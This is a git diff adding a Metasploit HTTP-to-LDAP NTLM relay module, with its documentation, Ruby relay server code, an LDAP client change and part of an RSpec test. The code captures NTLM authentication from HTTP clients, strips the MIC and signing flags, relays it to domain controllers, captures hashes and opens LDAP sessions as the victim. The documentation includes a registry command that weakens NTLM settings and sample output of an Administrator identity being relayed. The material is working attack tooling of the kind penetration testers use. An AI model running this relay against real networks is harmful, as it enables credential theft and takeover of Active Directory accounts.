@@ -1,0 +1,970 @@
+diff --git a/documentation/modules/auxiliary/server/relay/http_to_ldap.md b/documentation/modules/auxiliary/server/relay/http_to_ldap.md
+new file mode 100644
+index 0000000000000..50dbb9594363f
+--- /dev/null
++++ b/documentation/modules/auxiliary/server/relay/http_to_ldap.md
+@@ -0,0 +1,108 @@
++## Vulnerable Application
++
++### Description
++
++This module sets up an HTTP server that attempts to execute an NTLM relay attack against an LDAP server on the
++configured `RHOSTS`. The relay attack targets NTLMv1 authentication, as NTLMv2 cannot be relayed to LDAP due to the
++Message Integrity Check (MIC). The module automatically removes the relevant flags to bypass signing.
++
++This module supports relaying one HTTP authentication attempt to multiple LDAP servers. After attempting to relay to
++one target, the relay server sends a 307 to the client and if the client is configured to respond to redirects, the
++client resends the NTLMSSP_NEGOTIATE request to the relay server. Multi relay will not work if the client does not
++respond to redirects.
++
++The module supports relaying NTLM authentication which has been wrapped in GSS-SPNEGO. HTTP authentication info is sent
++in the WWW-Authenticate header. In the auth header base64 encoded NTLM messages are denoted with the NTLM prefix, while
++GSS wrapped NTLM messages are denoted with the Negotiate prefix. Note that in some cases non-GSS wrapped NTLM auth can
++be prefixed with Negotiate.
++
++If the relay attack is successful, an LDAP session is created on the target. This session can be used by other modules
++that support LDAP sessions, such as:
++
++- `admin/ldap/rbcd`
++- `auxiliary/gather/ldap_query`
++
++The module also supports capturing NTLMv1 and NTLMv2 hashes.
++
++### Setup
++
++For this relay attack to be successful, it is important to understand the difference between the Target Server (the
++Domain Controller receiving the relayed authentication) and the Victim Client (the machine sending the initial HTTP
++request) and how their respective configurations can impact the success of the attack.
++
++The Domain Controller must be configured to accept LM or NTLM authentication. This means the `LmCompatibilityLevel`
++registry key on the DC must be set to 4 or lower. If it is set to `5` ("Send NTLMv2 response only. Refuse
++LM and NTLM"), the DC will reject the relayed authentication and the module will fail.
++
++You can verify or modify the Domain Controller's level using the following commands:
++```cmd
++# To check the current level:
++reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa -v LmCompatibilityLevel
++
++# To set the level to 4 (or lower):
++reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa -v LmCompatibilityLevel /t REG_DWORD /d 0x4 /f
++```
++
++The client being coerced must be willing to send the vulnerable NTLM responses.
++- Non-Windows Clients: Custom tools or Linux-based HTTP clients are unaffected by Windows registry keys and can easily
++be relayed to a vulnerable DC.
++- Windows Clients: If you are coercing a native Windows HTTP client (like `Invoke-WebRequest` or a browser), the victim
++machine's `LmCompatibilityLevel` dictates what it is allowed to send. To successfully relay a Windows client, its local
++registry key typically needs to be set to `2` or lower. If the Windows client is operating at level `3` or higher, it
++restricts itself to sending only NTLMv2 responses, which will cause the relay to fail even if the target DC is vulnerable.
++
++## Verification Steps
++
++1. Start msfconsole
++2. Do: `use auxiliary/server/relay/http_to_ldap`  
++3. Set the `RHOSTS` options
++4. Run the module
++5. Send an authentication attempt to the relay server
++   6. `Invoke-WebRequest -Uri http://192.0.2.1/test -UseDefaultCredentials`
++7. Check the output for successful relays and captured hashes
++
++## Scenarios
++### Relaying to multiple targets
++```
++msf auxiliary(server/relay/http_to_ldap) > set rhosts 172.16.199.200 172.16.199.201
++rhosts => 172.16.199.200 172.16.199.201
++msf auxiliary(server/relay/http_to_ldap) > run
++[*] Auxiliary module running as background job 2.
++
++[*] Relay Server started on 0.0.0.0:80
++[*] Server started.
++msf auxiliary(server/relay/http_to_ldap) > [*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
++[*] Processing request in state unauthenticated from 172.16.199.130
++[*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
++[*] Processing request in state unauthenticated from 172.16.199.130
++[*] Received Type 1 message from 172.16.199.130, attempting to relay...
++[*] Attempting to relay to ldap://172.16.199.201:389
++[*] Dropping MIC and removing flags: `Always Sign`, `Sign` and `Key Exchange`
++[*] Received type2 from target ldap://172.16.199.201:389, attempting to relay back to client
++[*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
++[*] Processing request in state awaiting_type3 from 172.16.199.130
++[*] Received Type 3 message from 172.16.199.130, attempting to relay...
++[*] Dropping MIC and removing flags: `Always Sign`, `Sign` and `Key Exchange`
++[+] Identity: KERBEROS\Administrator - Successfully relayed NTLM authentication to LDAP!
++[+] Relay succeeded
++[*] Moving to next target (172.16.199.200). Issuing 307 Redirect to /ZdF7Ufkm0I
++[*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
++[*] Processing request in state unauthenticated from 172.16.199.130
++[*] Received Type 1 message from 172.16.199.130, attempting to relay...
++[*] Attempting to relay to ldap://172.16.199.200:389
++[*] Dropping MIC and removing flags: `Always Sign`, `Sign` and `Key Exchange`
++[*] Received type2 from target ldap://172.16.199.200:389, attempting to relay back to client
++[*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
++[*] Processing request in state awaiting_type3 from 172.16.199.130
++[*] Received Type 3 message from 172.16.199.130, attempting to relay...
++[*] Dropping MIC and removing flags: `Always Sign`, `Sign` and `Key Exchange`
++[+] Identity: KERBEROS\Administrator - Successfully relayed NTLM authentication to LDAP!
++[+] Relay succeeded
++[*] Target list exhausted for 172.16.199.130. Closing connection.
++msf auxiliary(server/relay/http_to_ldap) > sessions -i -1
++[*] Starting interaction with 5...
++
++LDAP (172.16.199.200) > getuid
++[*] Server username: KERBEROS\Administrator
++LDAP (172.16.199.200) >
++```
+\ No newline at end of file
+diff --git a/lib/msf/core/exploit/remote/http_server/relay.rb b/lib/msf/core/exploit/remote/http_server/relay.rb
+new file mode 100644
+index 0000000000000..935dd97431b79
+--- /dev/null
++++ b/lib/msf/core/exploit/remote/http_server/relay.rb
+@@ -0,0 +1,109 @@
++# -*- coding: binary -*-
++# frozen_string_literal: true
++
++module Msf
++  module Exploit::Remote::HttpServer
++    module Relay
++
++      include ::Msf::Auxiliary::MultipleTargetHosts
++      include ::Msf::Exploit::Remote::Relay::NTLM::HashCapture
++      include Msf::Exploit::Remote::HttpServer
++
++      attr_reader :logger
++
++      def initialize(info = {})
++        super
++        register_options(
++          [
++            OptPort.new('SRVPORT', [true, 'The local port to listen on.', 80]),
++            OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),
++            OptAddressRange.new('RHOSTS', [true, 'Target address range or CIDR identifier to relay to'], aliases: ['LDAPHOST', 'RELAY_TARGETS']),
++            OptInt.new('RELAY_TIMEOUT', [true, 'Seconds that the relay socket will wait for a response after the client has initiated communication.', 25])
++          ], self.class
++        )
++        @relay_clients = {}
++        @relay_clients_mutex = Mutex.new
++      end
++
++      def start_service(opts = {})
++        @logger = opts['Logger'] || self
++
++        super
++
++        @http_relay_service = self.service
++
++        relay_path = '/'
++        add_resource(
++          'Proc' => Proc.new { |cli, req| on_relay_request(cli, req) },
++          'Path' => relay_path
++        )
++      end
++
++      def on_relay_request(cli, req)
++        client_id = Rex::Socket.to_authority(cli.peerhost, cli.peerport)
++        cli.keepalive = true
++        relay_client = nil
++        print_status("Received #{req.method} request for #{req.uri} from #{client_id}")
++
++        # When the 307 redirect is sent to the client, it reconnects on a different port. So the relay server has to keep
++        # track of the redirect URIs and associate them with the same client session. This allows the state machine to
++        # continue seamlessly even if the client is bouncing between ports. Tracking the client ports but not redirect
++        # URI's ends up in an infinite loop of 307 redirects because the client appears to be a new session on each
++        # request. Tracking the redirect URI's allows us to correlate the new connection with the existing session
++        # and avoid the redirect loop.
++
++        @relay_clients_mutex.synchronize do
++          #  Try to find the client by their exact TCP connection
++          if @relay_clients.key?(client_id)
++            relay_client = @relay_clients[client_id]
++            relay_client.cli = cli
++          else
++            previous_client_id = @relay_clients.keys.find { |k| @relay_clients[k].redirect_uri == req.uri && req.uri != '/' }
++
++            if previous_client_id
++              # Seamlessly transfer the state machine from the old port to the new port
++              relay_client = @relay_clients.delete(previous_client_id)
++              relay_client.cli = cli
++              @relay_clients[client_id] = relay_client
++            else
++              # This is a truly new client session
++              relay_client = Msf::Exploit::Remote::HttpServer::Relay::NTLM::ServerClient.new(
++                cli,
++                relay_targets,
++                logger,
++                datastore['RELAY_TIMEOUT']
++              )
++              relay_client.redirect_uri = req.uri # Track their starting path
++              @relay_clients[client_id] = relay_client
++            end
++          end
++        end
++
++        relay_client.process_request(req)
++
++        @relay_clients_mutex.synchronize do
++          if relay_client.finished? && @relay_clients[client_id].equal?(relay_client)
++            @relay_clients.delete(client_id)
++          end
++        end
++      end
++
++      def send_auth_challenge(cli)
++        res = Rex::Proto::Http::Response.new
++        res.code = 401
++        res.message = "Unauthorized"
++        res.headers['WWW-Authenticate'] = "NTLM"
++
++        cli.put(res.to_s)
++      end
++
++      def cleanup
++        if @http_relay_service
++          @http_relay_service.remove_resource('/')
++          Rex::ServiceManager.stop_service(@http_relay_service)
++        end
++        super
++      end
++    end
++  end
++end
+\ No newline at end of file
+diff --git a/lib/msf/core/exploit/remote/http_server/relay/ntlm/server_client.rb b/lib/msf/core/exploit/remote/http_server/relay/ntlm/server_client.rb
+new file mode 100644
+index 0000000000000..b821dd3eb8e0d
+--- /dev/null
++++ b/lib/msf/core/exploit/remote/http_server/relay/ntlm/server_client.rb
+@@ -0,0 +1,374 @@
++# frozen_string_literal: true
++
++module Msf::Exploit::Remote::HttpServer::Relay::NTLM
++  class ServerClient
++
++    attr_reader :logger
++    attr_accessor :cli, :state, :redirect_uri
++
++    def initialize(cli, relay_targets, logger, timeout = 25)
++      @cli                 = cli
++      @state               = :unauthenticated
++      @relay_targets       = relay_targets
++      @logger              = logger
++      @timeout             = timeout
++      @relayed_connection  = nil
++      @current_target      = nil
++
++      @ntlm_context   = {
++        wrapper: :none,
++        type1: nil,
++        type2: nil
++      }
++    end
++
++    def process_request(req)
++      logger.print_status("Processing request in state #{state} from #{cli.peerhost}")
++      auth_header = req.headers['Authorization']
++      auth_type, b64_message = extract_ntlm_message(auth_header)
++
++      parsed_ntlm = nil
++      raw_ntlm_bytes = nil
++
++      if b64_message
++        begin
++          raw_ntlm_bytes = unwrap_ntlm_base64(b64_message)
++          parsed_ntlm = Net::NTLM::Message.parse(raw_ntlm_bytes)
++        rescue ::Exception => e
++          logger.print_error("Failed to parse incoming NTLM/SPNEGO message: #{e.message}")
++          abort_connection("Invalid NTLM payload.")
++          return
++        end
++      end
++
++      case state
++      when :unauthenticated
++        if parsed_ntlm.nil?
++          send_401_challenge
++        elsif parsed_ntlm.is_a?(Net::NTLM::Message::Type1)
++          logger.print_status("Received Type 1 message from #{cli.peerhost}, attempting to relay...")
++          handle_type1(raw_ntlm_bytes, parsed_ntlm, auth_type)
++        else
++          abort_connection("Expected No Auth or Type 1, got something else.")
++        end
++
++      when :awaiting_type3
++        if parsed_ntlm && parsed_ntlm.is_a?(Net::NTLM::Message::Type3)
++          logger.print_status("Received Type 3 message from #{cli.peerhost}, attempting to relay...")
++          handle_type3(parsed_ntlm)
++
++        elsif parsed_ntlm && parsed_ntlm.is_a?(Net::NTLM::Message::Type1)
++          logger.print_warning("Client restarted the handshake! Resetting state to handle new Type 1...")
++          @relayed_connection.disconnect! if @relayed_connection
++          @relayed_connection = nil
++          handle_type1(raw_ntlm_bytes, parsed_ntlm, auth_type)
++
++        else
++          abort_connection("Expected Type 3, got something else.")
++        end
++
++      when :done
++        # The relay is finished for this connection, ignore further requests
++      end
++    end
++
++    def create_relay_client(target, timeout)
++      case target.protocol
++      when :ldap
++        client = Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::Client.create(self, target, logger, timeout)
++      else
++        raise RuntimeError, "unsupported protocol: #{target.protocol}"
++      end
++
++      client
++    rescue ::Rex::ConnectionTimeout => e
++      msg = "Timeout error retrieving server challenge from target #{target}. Most likely caused by unresponsive target"
++      elog(msg, error: e)
++      logger.print_error msg
++      nil
++    rescue ::Exception => e
++      msg = "Unable to create relay to #{target}"
++      elog(msg, error: e)
++      logger.print_error msg
++      nil
++    end
++
++    def finished?
++      state == :done || state == :aborted
++    end
++
++
++    def send_401_challenge
++      res = Rex::Proto::Http::Response.new
++      res.code = 401
++      res.message = "Unauthorized"
++      res.headers['WWW-Authenticate'] = "NTLM, Negotiate"
++      res.headers['Connection'] = "Keep-Alive"
++      res.headers['Content-Length'] = "0"
++      res.body = ""
++
++      cli.put(res.to_s)
++    end
++
++    def handle_type1(raw_ntlm_bytes, parsed_ntlm, auth_type)
++      @ntlm_context[:type1] = raw_ntlm_bytes
++      @current_target ||= @relay_targets.next(cli.peerhost)
++
++      if @current_target.nil?
++        logger.print_status("Target list exhausted for #{cli.peerhost}. Closing connection.")
++        res = Rex::Proto::Http::Response.new
++        res.code = 404
++        res.message = "Not Found"
++        res.headers['Connection'] = "Close"
++        res.headers['Content-Length'] = "0"
++        cli.send_response(res)
++        @state = :done
++        return
++      end
++
++      begin
++        logger.print_status("Attempting to relay to #{Rex::Socket.to_authority(@current_target.ip, @current_target.port)}")
++        @relayed_connection = create_relay_client(@current_target, @timeout)
++
++        if @relayed_connection.nil?
++          logger.print_error("Connection to #{@current_target.ip} failed: unable to create relay client")
++          advance_to_next_target_via_redirect
++          return
++        end
++
++        if @current_target.drop_mic_and_sign_key_exch_flags
++          incoming_security_buffer = do_drop_mic_and_flags(parsed_ntlm)
++        elsif @current_target.drop_mic_only
++          incoming_security_buffer = do_drop_mic(parsed_ntlm)
++        else
++          incoming_security_buffer = parsed_ntlm.serialize
++        end
++
++        relay_result = @relayed_connection.relay_ntlmssp_type1(incoming_security_buffer)
++
++        if relay_result && relay_result.nt_status == WindowsError::NTStatus::STATUS_MORE_PROCESSING_REQUIRED
++          type2_msg = relay_result.message
++          @ntlm_context[:type2] = type2_msg
++
++          if @ntlm_context[:wrapper] == :gss_spnego
++            wrapped_type2 = RubySMB::Gss.gss_type2(type2_msg.serialize)
++            target_type2_msg = Rex::Text.encode_base64(wrapped_type2)
++            auth_header = "#{auth_type} #{target_type2_msg}"
++          else
++            target_type2_msg = Rex::Text.encode_base64(type2_msg.serialize)
++            auth_header = "#{auth_type} #{target_type2_msg}"
++          end
++          logger.print_status("Received type2 from target #{@current_target.protocol}://#{Rex::Socket.to_authority(@current_target.ip, @current_target.port)}, attempting to relay back to client")
++          res = Rex::Proto::Http::Response.new
++          res.code = 401
++          res.message = "Unauthorized"
++          res.headers['WWW-Authenticate'] = auth_header
++          res.headers['Connection'] = "Keep-Alive"
++          res.headers['Content-Length'] = "0"
++
++          cli.send_response(res)
++          @state = :awaiting_type3
++          return
++        else
++          logger.print_error("Target #{@current_target.ip} rejected the Type 1 message.")
++        end
++
++      rescue ::Exception => e
++        logger.print_error("Connection to #{@current_target.ip} failed: #{e.message}")
++      end
++
++      advance_to_next_target_via_redirect
++    end
++
++    def complete_current_relay_attempt(is_success:, identity: nil)
++      return unless @current_target
++
++      @relay_targets.on_relay_end(@current_target, identity: identity, is_success: is_success)
++    end
++
++    def handle_type3(parsed_type3)
++      relay_succeeded = false
++      relay_completed = false
++
++      # 1. Safely extract the identity from the Type 3 message early
++      identity = nil
++      if parsed_type3
++        domain = parsed_type3.domain.to_s.force_encoding('UTF-8')
++        user = parsed_type3.user.to_s.force_encoding('UTF-8')
++        identity = "#{domain}\\#{user}" unless user.empty?
++      end
++
++      if @current_target.drop_mic_and_sign_key_exch_flags
++        incoming_security_buffer = do_drop_mic_and_flags(parsed_type3)
++      elsif @current_target.drop_mic_only
++        incoming_security_buffer = do_drop_mic(parsed_type3)
++      else
++        incoming_security_buffer = parsed_type3.serialize
++      end
++
++      relay_result = @relayed_connection.relay_ntlmssp_type3(incoming_security_buffer)
++
++      if relay_result && relay_result.nt_status == WindowsError::NTStatus::STATUS_SUCCESS
++        relay_succeeded = true
++
++        logger.on_ntlm_type3(
++          address: @relayed_connection.target.ip,
++          ntlm_type1: @ntlm_context[:type1],
++          ntlm_type2: @ntlm_context[:type2],
++          ntlm_type3: parsed_type3,
++          service_name: 'HTTP'
++        )
++
++        if identity.blank?
++          logger.print_status("Anonymous Identity - Successfully authenticated against relay target #{@relayed_connection.target.ip}")
++          @relayed_connection.disconnect! if @relayed_connection
++        else
++          logger.print_good("Identity: #{identity} -  Successfully relayed NTLM authentication to LDAP!")
++          logger.on_relay_success(relay_connection: @relayed_connection, relay_identity: identity)
++        end
++
++        @relayed_connection = nil
++      else
++        logger.print_error("Relayed authentication failed or was rejected by LDAP.")
++        @relayed_connection.disconnect! if @relayed_connection
++        @relayed_connection = nil
++      end
++
++      complete_current_relay_attempt(is_success: relay_succeeded, identity: identity)
++      relay_completed = true
++
++      @state = :done
++
++      advance_to_next_target_via_redirect
++    rescue StandardError => e
++      logger.print_error("Relaying type 3 message to target #{@current_target.ip} failed: #{e.message}")
++      complete_current_relay_attempt(is_success: false, identity: identity) unless relay_completed
++    end
++
++    def advance_to_next_target_via_redirect
++      @current_target = @relay_targets.next(@cli.peerhost)
++
++      if @current_target
++        random_path = "/" + Rex::Text.rand_text_alphanumeric(10)
++
++        @redirect_uri = random_path
++        @logger.print_status("Moving to next target (#{@current_target.ip}). Issuing 307 Redirect to #{random_path}")
++
++        res = Rex::Proto::Http::Response.new
++        res.code = 307
++        res.message = "Temporary Redirect"
++        res.headers['Location'] = random_path
++
++        res.headers['Connection'] = "keep-alive"
++        res.headers['Content-Length'] = "0"
++
++        cli.send_response(res)
++
++        @state = :unauthenticated
++        @ntlm_context[:type1] = nil
++        @ntlm_context[:type2] = nil
++      else
++        @logger.print_status("Target list exhausted for #{cli.peerhost}. Closing connection.")
++        res = Rex::Proto::Http::Response.new
++        res.code = 404
++        res.message = "Not Found"
++        res.headers['Connection'] = "close"
++        res.headers['Content-Length'] = "0"
++
++        cli.send_response(res)
++        @state = :done
++      end
++    end
++    def abort_connection(reason)
++      logger.print_error("Aborting connection with #{cli.peerhost}: #{reason}")
++
++      res = Rex::Proto::Http::Response.new
++      res.code = 400
++      res.message = "Bad Request"
++      res.headers['Connection'] = "Close"
++      res.headers['Content-Length'] = "0"
++      res.body = ""
++      cli.put(res.to_s)
++      @state = :aborted
++    end
++
++    def unwrap_ntlm_base64(b64_msg)
++      buf = Rex::Text.decode_base64(b64_msg)
++
++      if valid_ntlm_blob?(buf)
++        @ntlm_context[:wrapper] = :none
++        return buf
++      end
++
++      gss_api = OpenSSL::ASN1.decode(buf)
++      if gss_api&.tag == 0 && gss_api&.tag_class == :APPLICATION
++        logger.print_status("Detected GSS-SPNEGO wrapping around the type1 NTLM message")
++        @ntlm_context[:wrapper] = :gss_spnego
++        return process_gss_spnego_init(buf)
++      elsif gss_api&.tag == 1 && gss_api&.tag_class == :CONTEXT_SPECIFIC
++        logger.print_status("Detected GSS-SPNEGO wrapping around the type3 NTLM message")
++        @ntlm_context[:wrapper] = :gss_spnego
++        return process_gss_spnego_targ(buf)
++      end
++
++      raise ArgumentError, "Unrecognized NTLM or SPNEGO payload"
++    end
++
++    def extract_ntlm_message(auth_header)
++      return nil unless auth_header
++
++      # Match either "NTLM <base64>" or "Negotiate <base64>" (case insensitive)
++      if auth_header =~ /^(NTLM|Negotiate)\s+(.+)$/i
++        return $1, $2 # Return The auth type and the base64 message
++      end
++
++      nil
++    end
++
++    private
++
++    def valid_ntlm_blob?(blob)
++      blob&.start_with?("NTLMSSP\x00")
++    end
++
++    def validate_ntlm_blob!(blob)
++      raise ArgumentError, 'The NTLM blob found was malformed' unless valid_ntlm_blob?(blob)
++    end
++
++    def process_gss_spnego_init(incoming_security_buffer)
++      begin
++        gss_init = Rex::Proto::Gss::SpnegoNegTokenInit.parse(incoming_security_buffer)
++        ntlm_blob = gss_init.mech_token
++        validate_ntlm_blob!(ntlm_blob)
++        ntlm_blob
++      rescue RASN1::ASN1Error => e
++        raise ArgumentError, "Failed to parse NTLMSSP Type1 from GSS: #{e.message}"
++      end
++    end
++
++    def process_gss_spnego_targ(incoming_security_buffer)
++      begin
++        gss_targ = Rex::Proto::Gss::SpnegoNegTokenTarg.parse(incoming_security_buffer)
++        ntlm_blob = gss_targ.response_token
++        validate_ntlm_blob!(ntlm_blob)
++        ntlm_blob
++      rescue RASN1::ASN1Error, ArgumentError => e
++        raise ArgumentError, "Failed to parse NTLMSSP Type3 from GSS: #{e.message}"
++      end
++    end
++
++    def do_drop_mic(ntlm_message)
++      logger.print_status('Dropping MIC')
++      ntlm_message.serialize
++    end
++
++    def do_drop_mic_and_flags(ntlm_message)
++      logger.print_status('Dropping MIC and removing flags: `Always Sign`, `Sign` and `Key Exchange`')
++      flags = ntlm_message.flag
++      flags &= ~Net::NTLM::FLAGS[:ALWAYS_SIGN] & ~Net::NTLM::FLAGS[:SIGN] & ~Net::NTLM::FLAGS[:KEY_EXCHANGE]
++
++      ntlm_message.flag = flags
++      ntlm_message.serialize
++    end
++  end
++end
+diff --git a/lib/msf/core/exploit/remote/relay/ntlm/target/ldap/client.rb b/lib/msf/core/exploit/remote/relay/ntlm/target/ldap/client.rb
+index eb28f7671b7a4..d4ea8ef35ea41 100644
+--- a/lib/msf/core/exploit/remote/relay/ntlm/target/ldap/client.rb
++++ b/lib/msf/core/exploit/remote/relay/ntlm/target/ldap/client.rb
+@@ -55,11 +55,21 @@ def relay_ntlmssp_type1(client_type1_msg)
+       )
+     end
+ 
++    # Determines whether the relay connection originated from an HTTP server.
++    #
++    # @return [Boolean] true if the provider's class name contains 'httpserver', false otherwise.
++    def is_http_source?
++      @provider && @provider.class.name.to_s.downcase.include?('httpserver')
++    end
++
+     # @param [String] client_type3_msg
+     # @rtype [Msf::Exploit::Remote::Relay::NTLM::Target::RelayResult, nil]
+     def relay_ntlmssp_type3(client_type3_msg)
+       ntlm_message = Net::NTLM::Message.parse(client_type3_msg)
+-      if ntlm_message.ntlm_version == :ntlmv2
++
++      # Suppress the warning for HTTP sources because they can safely relay NTLMv2 type 3 messages. During testing
++      # non-Windows HTTP clients that sent NTLMv2 type 3 messages were able to be relayed to LDAP without issue.
++      if ntlm_message.ntlm_version == :ntlmv2 && !is_http_source?
+         logger.print_warning('Relay client\'s NTLM type 3 message is NTLMv2, relaying to LDAP will not work')
+       end
+ 
+diff --git a/modules/auxiliary/server/relay/http_to_ldap.rb b/modules/auxiliary/server/relay/http_to_ldap.rb
+new file mode 100644
+index 0000000000000..29f95528d3020
+--- /dev/null
++++ b/modules/auxiliary/server/relay/http_to_ldap.rb
+@@ -0,0 +1,121 @@
++# frozen_string_literal: true
++
++##
++# This module requires Metasploit: https://metasploit.com/download
++# Current source: https://github.com/rapid7/metasploit-framework
++##
++require 'openssl'
++require 'rex/proto/gss'
++
++class MetasploitModule < Msf::Auxiliary
++  include Msf::Exploit::Remote::HttpServer::Relay
++  include Msf::Auxiliary::CommandShell
++
++  attr_accessor :service
++
++  def initialize(info = {})
++    super(
++      update_info(
++        info,
++        'Name' => 'Microsoft Windows HTTP to LDAP Relay',
++        'Description' => %q{
++          This module supports running an HTTP server which validates credentials, and
++          then attempts to execute a relay attack against an LDAP server on the
++          configured RHOSTS hosts.
++
++          It is not possible to relay NTLMv2 to LDAP due to the Message Integrity Check
++          (MIC). As a result, this will only work with NTLMv1. The module takes care of
++          removing the relevant flags to bypass signing.
++
++          If the relay succeeds, an LDAP session to the target will be created. This can
++          be used by any modules that support LDAP sessions, like `admin/ldap/rbcd` or
++          `auxiliary/gather/ldap_query`.
++
++          Supports LDAP and captures NTLMv1 as well as NTLMv2 hashes.
++        },
++        'Author' => [
++          'jheysel-r7' # module and http_relay server
++        ],
++        'License' => MSF_LICENSE,
++        'DefaultTarget' => 0,
++        'Actions' => [
++          [ 'CREATE_LDAP_SESSION', { 'Description' => 'Create an LDAP session' } ]
++        ],
++        'PassiveActions' => [ 'CREATE_LDAP_SESSION' ],
++        'DefaultAction' => 'CREATE_LDAP_SESSION',
++        'Notes' => {
++          'Stability' => [ CRASH_SAFE ],
++          'Reliability' => [ REPEATABLE_SESSION ],
++          'SideEffects' => [ IOC_IN_LOGS, ACCOUNT_LOCKOUTS ]
++        }
++      )
++    )
++
++    register_options(
++      [
++        Opt::RPORT(389)
++      ]
++    )
++
++    register_advanced_options(
++      [
++        OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true]),
++        OptInt.new('SessionKeepalive', [true, 'Time (in seconds) for sending protocol-level keepalive messages', 10 * 60])
++      ]
++    )
++  end
++
++  def srvport
++    datastore['SRVPORT']
++  end
++
++  def relay_targets
++    Msf::Exploit::Remote::Relay::TargetList.new(
++      :ldap,
++      datastore['RPORT'],
++      datastore['RHOSTS'],
++      datastore['TARGETURI'],
++      randomize_targets: datastore['RANDOMIZE_TARGETS'],
++      drop_mic_only: false,
++      drop_mic_and_sign_key_exch_flags: true
++    )
++  end
++
++  def check_options
++    unless framework.features.enabled?(Msf::FeatureManager::LDAP_SESSION_TYPE)
++      fail_with(Failure::BadConfig, 'This module requires the `ldap_session_type` feature to be enabled. Please enable this feature using `features set ldap_session_type true`')
++    end
++  end
++
++  def run
++    check_options
++
++    start_service
++    print_status('Server started.')
++    @http_relay_service.wait if @http_relay_service
++  end
++
++  def on_relay_success(relay_connection:, relay_identity:)
++    print_good('Relay succeeded')
++    session_setup(relay_connection, relay_identity)
++  rescue StandardError => e
++    elog('Failed to setup the session', error: e)
++  end
++
++  def session_setup(relay_connection, relay_identity)
++    client = relay_connection.create_ldap_client
++    ldap_session = Msf::Sessions::LDAP.new(
++      relay_connection.socket,
++      {
++        client: client,
++        keepalive_seconds: datastore['SessionKeepalive']
++      }
++    )
++    domain, _, username = relay_identity.partition('\\')
++    datastore_options = {
++      'DOMAIN' => domain,
++      'USERNAME' => username
++    }
++    start_session(self, nil, datastore_options, false, ldap_session.rstream, ldap_session)
++  end
++end
+diff --git a/spec/lib/msf/core/exploit/remote/relay/http_spec.rb b/spec/lib/msf/core/exploit/remote/relay/http_spec.rb
+new file mode 100644
+index 0000000000000..2ff63f58588f5
+--- /dev/null
++++ b/spec/lib/msf/core/exploit/remote/relay/http_spec.rb
+@@ -0,0 +1,198 @@
++require 'spec_helper'
++require 'msf/core/exploit/remote/http_server/relay'
++require 'net/ntlm'
++require 'windows_error'
++require 'base64'
++
++RSpec.describe Msf::Exploit::Remote::HttpServer::Relay do
++  let(:client_ip) { '172.16.199.159' }
++  let(:client_port) { 54321 }
++  let(:client_id) { Rex::Socket.to_authority(client_ip, client_port) }
++
++  def create_request(auth_header = nil)
++    req = Rex::Proto::Http::Request.new
++    req.method = 'GET'
++    req.headers['Authorization'] = auth_header if auth_header
++    req
++  end
++
++  let(:mock_cli) do
++    cli = double('Rex::Proto::Http::ServerClient')
++    allow(cli).to receive(:peerhost).and_return(client_ip)
++    allow(cli).to receive(:peerport).and_return(client_port)
++    allow(cli).to receive(:keepalive=)
++    allow(cli).to receive(:put)
++    allow(cli).to receive(:send_response)
++    cli
++  end
++
++  let(:mock_target) do
++    double('Target',
++           protocol: :ldap,
++           ip: '172.16.199.200',
++           port: 389,
++           drop_mic_and_sign_key_exch_flags: false,
++           drop_mic_only: false
++    )
++  end
++
++  let(:target_list) do
++    list = double('Msf::Exploit::Remote::Relay::TargetList')
++    allow(list).to receive(:next).and_return(mock_target)
++    allow(list).to receive(:on_relay_end)
++    list
++  end
++
++  let(:type2_msg) { double('Type2', serialize: 'TYPE2_BYTES') }
++  let(:type1_relay_result) { double('RelayResult', nt_status: WindowsError::NTStatus::STATUS_MORE_PROCESSING_REQUIRED, message: type2_msg) }
++  let(:type3_success_result) { double('RelayResult', nt_status: WindowsError::NTStatus::STATUS_SUCCESS) }
++  let(:type3_fail_result) { double('RelayResult', nt_status: WindowsError::NTStatus::STATUS_LOGON_FAILURE) }
++
++  let(:mock_ldap_client) do
++    client = double('LDAPClient', target: mock_target)
++    allow(client).to receive(:relay_ntlmssp_type1).and_return(type1_relay_result)
++    allow(client).to receive(:relay_ntlmssp_type3).and_return(type3_success_result)
++    allow(client).to receive(:disconnect!)
++    client
++  end
++
++  let(:relay_class) do
++    Class.new(Msf::Auxiliary) do
++      include Msf::Exploit::Remote::HttpServer
++      include Msf::Exploit::Remote::HttpServer::Relay
++
++      def initialize(info = {})
++        super
++      end
++
++      def relay_targets; end
++      def on_relay_success(relay_connection:, relay_identity:); end
++      def on_ntlm_type3(args); end
++
++      def print_status(msg); end
++      def print_error(msg); end
++      def print_good(msg); end
++      def print_warning(msg); end
++      def vprint_status(msg); end
++      def vprint_error(msg); end
++      def elog(msg, error: nil); end
++    end
++  end
++
++  subject(:relay_server) do
++    mod = relay_class.new
++    mod.instance_variable_set(:@logger, mod)
++    allow(mod).to receive(:relay_targets).and_return(target_list)
++    mod
++  end
++
++  let(:type1_bytes) { "NTLMSSP\x00TYPE1" }
++  let(:type3_bytes) { "NTLMSSP\x00TYPE3" }
++
++  let(:type1_b64) { Base64.strict_encode64(type1_bytes) }
++  let(:type3_b64) { Base64.strict_encode64(type3_bytes) }
++
++  let(:type1_msg) do
++    msg = Net::NTLM::Message::Type1.new
++    allow(msg).to receive(:serialize).and_return(type1_bytes)
++    msg
++  end
++
++  let(:type3_msg) do
++    msg = Net::NTLM::Message::Type3.new
++    allow(msg).to receive(:serialize).and_return(type3_bytes)
++    allow(msg).to receive(:domain).and_return('DOMAIN')
++    allow(msg).to receive(:user).and_return('USER')
++    msg
++  end
++
++  before(:each) do
++    allow(Net::NTLM::Message).to receive(:parse).with(type1_bytes).and_return(type1_msg)
++    allow(Net::NTLM::Message).to receive(:parse).with(type3_bytes).and_return(type3_msg)
++    allow(Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::Client).to receive(:create).and_return(mock_ldap_client)
++  end
++
++  def get_client_state(server)
++    clients = server.instance_variable_get(:@relay_clients) || {}
++    clients[client_id]
++  end
++
++  describe 'State Transitions' do
++    context 'when receiving an initial unauthenticated request' do
